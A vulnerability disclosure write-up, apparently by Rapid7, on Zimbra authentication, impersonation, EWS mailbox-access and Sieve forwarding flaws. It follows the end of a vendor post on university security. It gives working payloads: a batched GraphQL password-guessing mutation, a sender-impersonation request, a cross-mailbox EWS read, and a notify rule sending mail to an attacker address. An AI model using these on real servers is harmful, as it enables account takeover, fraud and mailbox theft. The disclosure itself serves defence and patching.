Universities also have large external attack surfaces that can be difficult to inventory centrally. Student portals, APIs, research servers, faculty websites, and other internet-facing assets may be created outside normal IT processes. Rapid7's Project Sonar continuously scans the public internet, helping organizations identify externally exposed services and assets that internal inventories may have missed.

Vulnerability prioritization needs more than a severity score

University security teams rarely have the capacity to remediate every vulnerability at once, so prioritization has to reflect how likely an exposure is to be used in a real attack.

Rapid7 combines vulnerability data with attacker intelligence, including insight from Metasploit, our open source penetration testing framework used by security professionals to test and validate real-world exploits, with more than 3,000 exploit modules.

That intelligence is combined with insight from AttackerKB, incident response engagements, honeypots, and other threat intelligence sources, giving teams additional context around whether an exploit exists, whether exploitation has been observed, and how difficult a vulnerability may be to use in practice.

For a university working through thousands of findings across multiple campuses, that context can help teams direct limited remediation capacity toward exposures with stronger evidence of attacker interest rather than relying on severity scores alone.

Incident response has to work across campus boundaries

The compliance requirements discussed in Part 2 put added pressure on investigation speed, particularly when legal or compliance teams need to establish whether regulated student, financial, health, or research data was accessed across more than one campus.

Rapid7's open source Velociraptor platform can collect forensic artifacts and run live investigations across thousands of endpoints simultaneously. In a multi-campus university, that could allow investigators to determine whether the same activity or data access occurred across several environments without conducting each investigation separately.

Automated response workflows can also be distributed across affected campus environments, allowing teams to isolate compromised systems, revoke credentials, or block indicators consistently rather than repeating the same response manually at each institution.

Campuses with smaller security teams benefit from that shared capability because the quality and speed of response are less dependent on how many people happen to be available locally when an incident occurs.

Consolidation can return time to stretched security teams

The operational case for a shared security model also comes down to the amount of work created by fragmentation. Separate campus tools mean separate licenses, integrations, training requirements, renewals, reporting processes, and vendor relationships, all of which consume time that understaffed security teams could be spending elsewhere.

The source material for this series includes an example of one organization recovering 96 hours per month by reducing manual work across disparate security tools. It also cites an average 74% improvement in mean time to detect where unified visibility and threat correlation were applied. For higher education teams working within tight regulatory reporting windows, the difference between finding an incident in hours rather than days can have a direct impact on how quickly the institution can assess scope and respond.

A system-wide agreement can also reduce the number of contracts, renewal cycles, and vendor relationships that central and campus teams need to manage, while allowing security capabilities to scale as the institution adds campuses, devices, and cloud services.

Building security around the university as a whole

Multi-campus universities will always have different technology needs across individual campuses, research environments, health services, and administrative functions. A connected security model does not require those environments to operate identically, but it does give central and local teams a better way to understand shared risk, coordinate investigations, and apply consistent response when an issue extends beyond a single campus.

Across this series, the same pattern has appeared from different angles. Threats move across organizational boundaries, regulated data rarely sits neatly within one campus, and the people responsible for protecting university systems are already working with limited time and resources. Bringing more of that security context together can help teams respond faster, share intelligence more effectively, and reduce the manual work created by disconnected tools and processes.

item.title: From One Account to Every Mailbox: Breaking Zimbra's Identity Boundaries (Part 1)
item.description:
An enterprise mail server authenticates users, stores private communications, delivers recovery links, runs calendars, and sends mail that employees and other systems trust. Compromising it can therefore expose both email and the identities and workflows built around it.

During a broader assessment of Zimbra Collaboration Suite (ZCS), Rapid7 reported more than 80 vulnerabilities spanning authentication, mailbox authorization, calendar processing, web clients, document services, and the host operating system. The affected components are being fixed on different schedules, so we are publishing the analysis in stages. An accompanying GitHub repository containing full write-ups and PoCs serves as a live technical tracker, and will be updated as further findings and fixes become public.

This first article concentrates on five account-related vulnerabilities:

CVE

Finding

Rapid7 CVSS

Fixed release

CVE-2026-93637

GraphQL authentication rate-limit bypass

No public fix listed

CVE-2026-93635

CVE-2026-73571

Email impersonation via SaveDraftRequest

8.3 High

Part 2 will cover unauthenticated stored XSS paths in the Classic and Modern clients and what they can do with the recipient's session. A script can install the Sieve forwarding rule (CVE-2026-50055); another path preserves direct mailbox access after the original session expires or the victim changes their password. CVE-2026-73571 makes these attacks more credible by placing the message in the mailbox as any chosen local user.

Parts 3 and 4 move through the document-service boundary from SSRF to code execution as zimbra, then cover multiple independent paths from zimbra to root. The BruCON presentation, Signed, Sealed, Compromised: Weaponizing Enterprise Mail Infrastructure, previewed these chains, including selected root-command output returned to the victim's browser after one message selection.

Product description

Zimbra Collaboration Suite is a self-hosted platform for email, calendars, contacts, tasks, and file sharing. Zimbra calls its commercial server Network Edition. Within one Network Edition installation, customers can license a mixture of Standard and Professional users. Zimbra Desktop and Zimbra Connector for Outlook are separate client applications, while Exchange Web Services (EWS) is a separately licensed server feature for Outlook compatibility.

ZCS includes two webmail clients with different request and rendering stacks: Classic relies primarily on SOAP, while Modern uses GraphQL. The server also accepts SMTP and iCalendar input, exposes compatibility services such as EWS, and delegates work to local components running under several operating-system identities.

Testing setup

Rapid7 initially assessed ZCS 10.1.16_GA_4850 Network Edition on Ubuntu 22.04. For fixed findings, each section describes Zimbra's fix and the accompanying Github repository retains the complete vulnerable-to-fixed diff.

Impact

The pre-authentication findings lower separate barriers to obtaining a foothold. GraphQL hides failed password attempts from Zimbra's source-IP counter. In the configured external-LDAP case, a second flaw can also leave the optional account-lockout policy with no local account to lock.

Each remaining finding is independently exploitable from an ordinary compromised account. Email impersonation needs no optional feature: the attacker places a different local address in an authenticated request. Zimbra submits the message from that account through the trusted outbound pipeline and records a copy in the selected user's Sent folder.

If EWS is enabled for the compromised account, the attacker can read private conversations, attachments, drafts, sent mail, contacts and calendar entries from other users' mailboxes. A separate Sieve policy bypass can keep copies of future mail flowing to the attacker after the original session expires or the password changes.

These examples do not represent everything an attacker can do with authenticated Zimbra access, or the full vulnerability set from the assessment.

GraphQL authentication rate-limit bypass (CVE-2026-93637)

This pre-authentication route requires only HTTPS access to Zimbra. ZimbraInvalidLoginFilter normally records failed logins by source address around requests to the public service endpoints. Classic submits login attempts through the SOAP AuthRequest path, whereas Modern exposes the same password check through its GraphQL authenticate mutation.

That limiter's failure threshold is 10 by default, and after a source crosses it within the configured window, subsequent requests handled by the filter receive HTTP 503. CVE-2026-93637 allows attempts through GraphQL to remain invisible to that counter.

Technical analysis

The failure counter relies on a request attribute

ZimbraInvalidLoginFilter wraps requests to the public service endpoints and runs the downstream handler before its counter logic:

// ZimbraInvalidLoginFilter.doFilter()
// ... whitelist, disabled-filter and existing-suspension handling omitted
chain.doFilter(request, response);
if (req.getAttribute(AUTH_FAILED) != null) { // [0] wrapper-supplied signal
    // ... logging omitted
    boolean loginFailed = (Boolean)req.getAttribute(AUTH_FAILED);
    if (loginFailed) {
        // ... per-IP counter lookup and initialization omitted
        if (count.incrementAndGet() > this.maxFailedLogin) {
            this.numberOfFailedOccurence.put(clientIp, count);
            this.suspiciousIpAddrLastAttempt.put(
                clientIp, System.currentTimeMillis());
        }
        this.numberOfFailedOccurence.put(clientIp, count);
    }
    // ... final debug logging omitted
}

At [0], failure processing begins only if the downstream path added auth.failed to the request. The relevant SOAP exception path is:

// SoapEngine.dispatchRequest()
// ... earlier dispatch handling omitted
catch (AccountServiceException.AuthFailedServiceException e) {
    HttpServletRequest httpReq = (HttpServletRequest)context.get("servlet.request");
    httpReq.setAttribute("auth.failed", (Object)Boolean.TRUE); // [1] failure becomes visible
    String clientIp = (String)context.get(REQUEST_IP);
    httpReq.setAttribute(REQUEST_IP, (Object)clientIp);
    response = soapProto.soapFault((ServiceException)e);
    // ... debug and informational logging omitted
}

At [1], SoapEngine.dispatchRequest() sets the attribute before returning the authentication fault. A failed SOAP login therefore reaches the check at [0] and increments the source-IP counter.

GraphQL skips the SOAP failure handler

Modern Zimbra's GraphQL extension builds an ordinary AuthRequest, then reaches its handler through XMLDocumentUtilities.executeDocumentAsGuest():

// XMLDocumentUtilities.executeDocumentAsGuest()
public static Element executeDocumentAsGuest(DocumentHandler handler,
        Element request, RequestContext rctxt) throws ServiceException {
    HashMap<String, Object> context = new HashMap<String, Object>();
    context.put("zimbra.context",
        GQLAuthUtilities.getGuestZimbraSoapContext(request.getQName(), handler, rctxt));
    context.put("servlet.request", rctxt.getRawRequest());
    context.put("servlet.response", rctxt.getRawResponse());
    return handler.handle(request, context); // [2] bypasses SoapEngine
}

At [2], the helper calls the authentication handler without passing through SoapEngine. An incorrect password still becomes a GraphQL error, but the catch block at [1] never runs. The attribute read at [0] is absent, so the filter does not increment the source-IP counter.

Exploitation

Batched authentication

An unauthenticated client sends JSON to /service/extension/graphql. GraphQL aliases let its query field invoke authenticate repeatedly with different passwords:

mutation {
  a0: authenticate(authInput: {account: {accountBy: name, key: "victim@example.test"}, password: "pass0"}) { authToken }
  a1: authenticate(authInput: {account: {accountBy: name, key: "victim@example.test"}, password: "pass1"}) { authToken }
  a2: authenticate(authInput: {account: {accountBy: name, key: "victim@example.test"}, password: "pass2"}) { authToken }
}

Each alias performs a real authentication operation. Failures appear in the GraphQL errors array, while a successful alias returns an authentication token under its corresponding name. The GraphQL engine imposes no application-level alias limit on this path. The whole document remains one HTTP request, so Jetty's request-count control sees one request rather than the number of login operations inside it.

Alias execution is sequential and backend-bound, so the rate depends on the deployment. Using 100 aliases per request, 10,000 candidates completed in under two minutes without the Zimbra IP counter or Jetty's request filter blocking the source. The vulnerability removes IP-level failed-login accounting and reduces request overhead.

The CVE-2026-93637 PoC accepts an ordinary password file, generates the batched GraphQL documents and reports the accepted candidate.

Per-account lockout

The IP counter is not Zimbra's only possible control. Its separate per-account lockout policy is disabled by default, but when enabled, failed GraphQL operations still increment the target local account's counter and stop further guessing when that account locks.

CVE-2026-93635 and external LDAP

On domains configured with external LDAP search-filter authentication and lazy auto-provisioning, CVE-2026-93635 turns the login field into a password oracle for an external directory user. LdapUtil.computeDn() substitutes a wildcarded login such as jdoe*@example.test into the configured filter without escaping it. If that pattern selects one directory entry, Zimbra tries the candidate password against that user. An incorrect password returns account.AUTH_FAILED; a correct password passes the LDAP bind and reaches lazy provisioning, producing a different response.

The wildcarded login is not the name of an existing local Zimbra account, so the optional per-account lockout has no account against which to record the failed attempt. Sending the same operation through GraphQL also avoids the source-IP counter. With per-account lockout enabled and its threshold set to five, repeated wrong candidates incremented neither counter, while a correct password remained distinguishable. This two-bug composition applies only to the stated external-LDAP configuration, not Zimbra's default local-authentication path.

The LDAP/GraphQL composition PoC and CVE-2026-93635 tracker entry cover this configured external-directory path in detail. The CVE-2026-93637 tracker entry records the standalone finding and affected-version evidence.

Impact

Anyone who can reach the public GraphQL endpoint can make repeated password guesses without triggering Zimbra's source-IP suspension. Batching several candidates also reduces the number of HTTP requests and the associated network overhead. This makes weak, reused or previously exposed passwords more practical to test, but it does not reveal a strong password or bypass a separate MFA check.

Email impersonation via SaveDraftRequest (CVE-2026-73571)

SaveDraftRequest has a delegated-sending path selected by isDelegatedReq. On a vulnerable server, an ordinary user can place another local address in the request's From field. The handler resolves that address to its mailbox, assumes the mailbox owner's authority and calls Zimbra's normal send routine without checking whether the signed-in account has send-as rights. This is an application authorization failure, not a forged display name or a hand-written SMTP header: Zimbra submits the attacker's message as the selected account and adds the corresponding item to that account's Sent folder.

The target must be on the same mailbox server, but the attack requires no optional Zimbra feature, existing delegation, administrator right or victim action.

Technical Analysis

Claimed sender becomes mailbox authority

After the request parser extracts the From address, the delegated branch resolves that address to a local account and reads an optional delegateeAccountId:

// SaveDraft.handle() excerpt
// ... message fields, From address and delegation attributes parsed above
if (mailAddress != null) {
    delegatorAccount = prov.get(
        Key.AccountBy.name, mailAddress, zsc.getAuthToken()); // [0] account named by From
}
if (isDelegatedReq) {
    delegatorMbox = MailboxManager.getInstance()
        .getMailboxByAccountId(delegatorAccount.getId());
    Account delegateeAccount = null;
    OperationContext oct = null;
    if (delegateeAccountId != null) {
        delegateeAccount = prov.getAccountById(delegateeAccountId);
        oct = new OperationContext(delegateeAccount); // [1] supplied account context
    } else if (delegatorMbox != null) {
        oct = new OperationContext(delegatorMbox); // [2] claimed sender context
    }
    if (oct != null && delegatorMbox != null) {
        mm = ParseMimeMessage.parseMimeMsgSoap(
            zsc, oct, delegatorMbox, msgElem, null, mimeData);
        boolean deliveryReport = false;
        // ... optional delivery-report update omitted
        SendMsg.doSendMessage(oct, delegatorMbox, mm, mimeData.uploads,
            null, "r", null, null, false, false, false, deliveryReport); // [3] platform delivery
    }
    // ... response construction omitted
}

There is no checkRight(), canAccessAccount(), or canSendAs() call between resolving the account at [0] and delivery at [3]. In the demonstrated request, delegateeAccountId is absent. At [2], Zimbra constructs the operation context from the mailbox named in From, causing the later send to treat the selected account as the caller. [3] then submits the message through Zimbra's legitimate sending path.

There is a second way to trigger the flaw. The attacker can supply the claimed sender's account UUID in delegateeAccountId. At [1], Zimbra constructs the operation context directly from that account and reaches the same impersonation result without checking the identity that was actually signed in.

Exploitation

Sending as a local identity

The relevant SaveDraftRequest body is:

<SaveDraftRequest xmlns="urn:zimbraMail" isDelegatedReq="1">
  <m>
    <e t="t" a="recipient@example.test"/>
    <e t="f" a="ceo@example.test"/>
    <su>Updated payroll review</su>
    <mp ct="text/plain"><content>Please review the changes.</content></mp>
  </m>
</SaveDraftRequest>

Because Zimbra submits the message through its legitimate infrastructure, the issue goes beyond display-name spoofing. On a deployment whose legitimate outbound mail passes SPF, DKIM, and DMARC, the impersonated message passes them too: it uses the same source MTA, signing domain, RFC sender, and envelope sender as legitimate mail from the selected account. Local testing confirmed that sender alignment and normal MTA path.

The CVE-2026-73571 PoC submits the delegated request with an operator-selected sender, recipient, subject and message body. On the affected build, the message arrived with the CEO as its RFC sender, and the same subject appeared in the CEO's Sent folder.

Impact

An attacker can impersonate any local user, not only an administrator or executive. Internally, that allows believable payment requests, changes to account details, malicious links, false instructions and fraudulent approvals. Normal display-name spoofing warnings and external-sender banners do not help because Zimbra submits the message as the selected local user.

Zimbra also places the forged message in the impersonated user's Sent folder. This leaves a fabricated record of authorship and can support an attempt to frame that user.

For external recipients, the attacker can send from a finance account to request new payment details, use an operations account to cancel or alter an order, or send scams and abusive mail under an employee's address. The consequences depend on the role and relationships of the selected sender.

The same trusted-delivery advantage applies to exploit-bearing mail. The next article will examine browser-side findings that an attacker can deliver from any chosen local account. Impersonation is not required for the XSS itself, but can make the message appear to come from somebody the recipient trusts.

Fix

The patch in ZCS 10.1.17 retains the account that actually signed in unless it has an explicit send-as or send-on-behalf-of right. An unauthorized delegated request consequently runs as the caller rather than the account named in the message.

EWS cross-user mailbox access (CVE-2026-10631)

Zimbra's EWS extension uses composite folder IDs intended for shared-mailbox operations. FindItem trusts the owner UUID inside an attacker-supplied ID and constructs the authorization context from the selected mailbox instead of the account that signed in. This Insecure Direct Object Reference (IDOR) lets any ordinary EWS-enabled account read complete items from other users' mailboxes without a share or delegation grant.

The attacker needs zimbraFeatureEwsEnabled=TRUE. Although disabled by default, deployments using Zimbra's Outlook desktop integration commonly enable EWS class-of-service-wide. The target account does not need EWS enabled, and no target-user action is required.

Technical analysis

Composite IDs select the mailbox

To address a shared item, EWS needs to identify both the mailbox that owns it and the item or folder inside that mailbox. Zimbra encodes this as {ownerUUID}_{numericId}. For example:

5e05e6e2-8810-4c2a-a7ac-3771df62e344_2
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^
              owner UUID             +-- folder 2 (Inbox)

When FindItem receives a composite ID, FolderUtil.parseItemId() separates the owner and numeric portions. The owner value is then passed to ItemUtil.getGrantorMailbox():

// ItemUtil.getGrantorMailbox()
public static Mailbox getGrantorMailbox(String ownerId) throws ServiceException {
    Provisioning prov = Provisioning.getInstance();
    Account ownerAcct = prov.get(Key.AccountBy.id, ownerId); // [0] supplied owner UUID
    Mailbox mailboxOwnr = MailboxManager.getInstance()
        .getMailboxByAccount(ownerAcct); // [1] selected mailbox
    return mailboxOwnr;
}

At [0], EWS resolves the supplied owner UUID to a local account; [1] retrieves that account's mailbox. Neither method receives the caller's identity.

The mailbox becomes the authenticated identity

The authenticated account and selected mailbox are then passed to ItemOperation:

// ItemOperation.ItemOperation()
public ItemOperation(Account account, Mailbox mailbox, ZimbraAuth zimbraAuth)
        throws ServiceException {
    this.account = account; // [2] authenticated attacker
    this.mailbox = mailbox; // [3] selected owner's mailbox
    this.octxt = mailbox == null
        ? new OperationContext(account)
        : new OperationContext(mailbox); // [4] selected owner context
    this.zimbraAuth = zimbraAuth;
    this.octxt.setUserAgent(zimbraAuth.getUserAgent());
}

[2] is the attacker account. Supplying a victim UUID makes [3] the victim mailbox, so it is not null. [4] therefore creates OperationContext from the victim mailbox instead of the attacker account.

// OperationContext constructors
public OperationContext(Mailbox mbox) throws ServiceException {
    this(mbox.getAccount()); // [5] target mailbox owner
}

public OperationContext(Account acct) {
    this(acct, false);
}

public OperationContext(Account acct, boolean admin) {
    this.authuser = acct; // [6] identity used for permission checks
    // ... remaining context initialization omitted
}

[5] extracts the victim account from that mailbox, and [6] stores the victim as the authenticated user. The mailbox then compares this identity with its owner:

// Mailbox.getAuthenticatedAccount()
Account getAuthenticatedAccount() {
    // ... context and authenticated-user lookup omitted
    if (authuser != null && authuser.getId().equals(this.getAccountId())) {
        authuser = null; // [7] matching identity is treated as owner access
    }
    return authuser;
}

The identities match, so [7] changes the authenticated user to null, which downstream checks treat as owner access. The attacker's request is consequently authorized as the victim. EWS has used the untrusted owner UUID both to select a mailbox and to decide who is authenticated. The numeric folder ID is subsequently resolved within that owner context, allowing FindItem to access any folder in the selected mailbox.

Exploitation

Resolving a target mailbox

A target UUID is available through ordinary authenticated directory lookups. Both GetAccountInfoRequest and SearchGalRequest return zimbraId for a known local address. The PoC uses GetAccountInfoRequest:

<GetAccountInfoRequest xmlns="urn:zimbraAccount">
  <account by="name">victim@example.test</account>
</GetAccountInfoRequest>

The response contains the target's UUID:

<attr name="zimbraId">5e05e6e2-8810-4c2a-a7ac-3771df62e344</attr>

Appending _2 to the UUID forms the target's Inbox identifier. The attacker sends the following EWS request to /service/extension/zimbraews, or to /EWS/Exchange.asmx when EWS is exposed through Zimbra's standard proxy:

<m:FindItem Traversal="Shallow"
    xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
    xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
  <m:ItemShape>
    <t:BaseShape>AllProperties</t:BaseShape>
    <t:IncludeMimeContent>true</t:IncludeMimeContent>
  </m:ItemShape>
  <m:IndexedPageItemView MaxEntriesReturned="5" Offset="0" BasePoint="End"/>
  <m:ParentFolderIds>
    <t:FolderId Id="5e05e6e2-8810-4c2a-a7ac-3771df62e344_2"/>
  </m:ParentFolderIds>
</m:FindItem>

The server returns the selected mailbox's data in the EWS response:

<ns2:Message xmlns:ns2="http://schemas.microsoft.com/exchange/services/2006/types">
  <!-- Complete base64 MIME and other returned fields omitted. -->
  <ns2:ItemId Id="5e05e6e2-8810-4c2a-a7ac-3771df62e344_380" ChangeKey="600"/>
  <ns2:Subject>Project Phoenix acquisition timeline</ns2:Subject>
  <ns2:Body BodyType="Text">The target accepted the preliminary terms.
    Board approval is due Friday. Keep this strictly confidential.</ns2:Body>
  <ns2:HasAttachments>true</ns2:HasAttachments>
  <ns2:From><ns2:Mailbox>
    <ns2:EmailAddress>finance@northbridge.example</ns2:EmailAddress>
  </ns2:Mailbox></ns2:From>
  <ns2:InternetMessageId><20261005150023.563F6400B9@mail.lab.local></ns2:InternetMessageId>
</ns2:Message>

The CVE-2026-10631 PoC obtains that UUID and creates the composite ID automatically.

Cross-account folder reads

Changing the numeric component selects another well-known folder:

Folder

Crafted ID

Unauthorized result

Inbox

{uuid}_2

Received messages and attachments

Sent

{uuid}_5

Messages sent by the target

Drafts

{uuid}_6

{uuid}_7

{uuid}_10

If the target mailbox is on another server in the same Zimbra cluster, the first server forwards the crafted request. The receiving server resolves its local mailbox from the same owner UUID and reaches the vulnerable FindItem constructor.

The CVE-2026-10631 tracker entry covers the full response, affected folders and multi-server path in detail.

Impact

EWS exposes the victim's private message bodies and attachments, as well as drafts, sent mail, contacts and calendar data. The attacker can monitor conversations and use their history to make the separate impersonation attack more credible.

An attacker can also request a password reset for another service, monitor the corresponding mailbox and consume the link. EWS does not bypass third-party MFA by itself, but it exposes an email channel that many services still treat as sufficient proof. Because the owner UUID is attacker-selected, the same ordinary EWS account can repeat these reads against other local mailboxes.

Note that an earlier version of this analysis, presented at BruCON 2026, attributed GetItem, send, move and delete to the same flaw. Comparing intermediate Network Edition releases during this research required multiple restored VM appliances, because EWS is license-gated and normal patching advances the complete system; one appliance retained a separate mailbox authorization state that obscured the boundary, which initially made the impact appear broader. Repeating each operation with explicit authorization and target-state controls narrowed the CVE to FindItem, which still exposes complete MIME and attachments.

Fix

The patch in ZCS 10.1.20 creates the EWS authorization context from the account that signed in, not the mailbox selected by the composite ID. Zimbra applied that correction to both local and remote mailbox operations.

Sieve notify forwarding-restriction bypass (CVE-2026-50055)

zimbraFeatureMailForwardingInFiltersEnabled=FALSE is meant to stop users creating server-side mail-forwarding rules. Zimbra enforces it by rejecting Sieve redirect, but accepts notify even though that action can send selected headers and the complete text body to an arbitrary external address. An authenticated user can therefore install persistent mail exfiltration despite the administrator's restriction. If forwarding is normally allowed, there is no policy boundary to bypass.

Technical analysis

Redirect is the only blocked action

Both the ModifyFilterRulesRequest and ModifyOutgoingFilterRulesRequest SOAP commands call checkForwardFilterAttr() before saving a rule. The check recognizes only one action type:

// DocumentHandler.checkForwardFilterAttr()
public boolean checkForwardFilterAttr(Account account, List<FilterRule> filterRules,
        String filterRuleType) throws ServiceException {
    if (!account.isFeatureMailForwardingInFiltersEnabled() && !filterRules.isEmpty()) {
        for (FilterRule filterRule : filterRules) {
            if (!Objects.requireNonNull(filterRule.getFilterActions()).stream()
                .anyMatch(FilterAction.RedirectAction.class::isInstance) // [0] redirect only
                || this.checkIfFilterAlreadyExists(filterRule, account, filterRuleType))
                continue;
            return false;
        }
    }
    return true; // [1] all other actions allowed
}

At [0], the policy classifies only RedirectAction as forwarding, meaning NotifyAction and RFCCompliantNotifyAction reach [1] even though they can send attacker-selected message content to an external email address.

Notify expands message content

These actions can include message content rather than just a generic alert because SoapToSieve.getSieveScript() enables the variables and enotify extensions. FilterUtil.getVarsMap() then supplies the values available to the notification:

// FilterUtil.getVarsMap() excerpt
// ... case-insensitive variable-map construction omitted
Enumeration enumeration = mimeMessage.getAllHeaders();
while (enumeration.hasMoreElements()) {
    Header header = (Header)enumeration.nextElement();
    vars.put(header.getName().toLowerCase(),
        ZInternetHeader.decode(
            mimeMessage.getHeader(header.getName(), ","))); // [2] decoded headers
}
vars.put("subject", parsedMessage.getSubject());
MPartInfo bodyPart = Mime.getTextBody(parsedMessage.getMessageParts(), false);
if (bodyPart != null) {
    // ... IOException handling omitted
    vars.put("body", Mime.getStringContent(
        bodyPart.getMimePart(),
        mailbox.getAccount().getPrefMailDefaultCharset())); // [3] selected text body
}
return vars;

When the rule runs, Notify.executeBasic() expands those variables into the notification subject and body. [2] makes decoded headers available, and [3] supplies the text part selected by Mime.getTextBody(). It does not supply raw MIME or attachments.

Exploitation

Installing persistent exfiltration

An authenticated user can place the following rule object inside ModifyFilterRulesRequest:

<filterRule name="Email Notification" active="1">
  <filterTests condition="allof"><trueTest/></filterTests>
  <filterActions>
    <actionNotify a="attacker@external.example"
      su="Fwd: ${subject}"
      content="From: ${from}
To: ${to}
Subject: ${subject}

${body}"/>
    <actionKeep/>
  </filterActions>
</filterRule>

actionKeep leaves the original message in the user's Inbox, while each matching delivery sends the selected message text and headers to the external address.

The CVE-2026-50055 PoC preserves existing filters while installing the notify rule. After an ordinary message arrived for the filtered account, another mailbox received its subject, sender, recipients, date and complete text body. The CVE-2026-50055 tracker entry has the complete affected-version information.

Hidden from Modern

The persistence is not apparent in Modern. During testing, the server returned the active notification rule while the same account's Filters view remained empty. The server continued to run the rule normally, but Modern did not give the account owner a way to discover or remove it.

Classic did list the attacker-selected name under Active Filters, but its overview did not expose the notification address or copied fields. The rule is therefore not invisible from every client, and an attacker can choose a less conspicuous name.

Impact

The flaw defeats an administrator's attempt to prevent users from forwarding mail with server-side filters. An attacker with an authenticated session can install the rule directly. It continues to disclose future message text and headers after that session expires or the password changes, without appearing in Modern's Filters view. It does not forward attachments or raw MIME.

Fix

The patch in ZCS 10.1.20 treats notify and its RFC-compliant variant as forwarding actions and rejects them under the same account policy as redirect.

Remediation

Apply the latest supported Zimbra release. Zimbra's security advisory lists CVE-2026-73571 as fixed in ZCS 10.1.17 and CVE-2026-10631 and CVE-2026-50055 as fixed in ZCS 10.1.20. No fixed release is publicly listed for CVE-2026-93635 or CVE-2026-93637 at the time of publication, so install the security update containing those fixes when Zimbra releases it.

Upgrading does not remove filter rules already saved to accounts. Administrators should inspect the stored incoming and outgoing filter rules for external actionNotify and RFC-compliant notify actions that violate forwarding policy; Modern's Filters view is not sufficient for this review.

Detection and Incident Response

A reverse proxy or web application firewall that inspects request bodies can detect multiple authenticate aliases in one anonymous GraphQL request. Zimbra's EWS logs expose cross-user operations involving two different account UUIDs, as shown in the EWS IoCs. Saved notify rules and outbound notification traffic provide more direct evidence of the Sieve path.

EWS creates no delegation grant to revoke, Sieve rules remain as saved account state, and sender impersonation can generate ordinary Sent and MTA artifacts. Recovery must cover those server-side changes and any other mailbox reached, not only the password of the account first compromised.
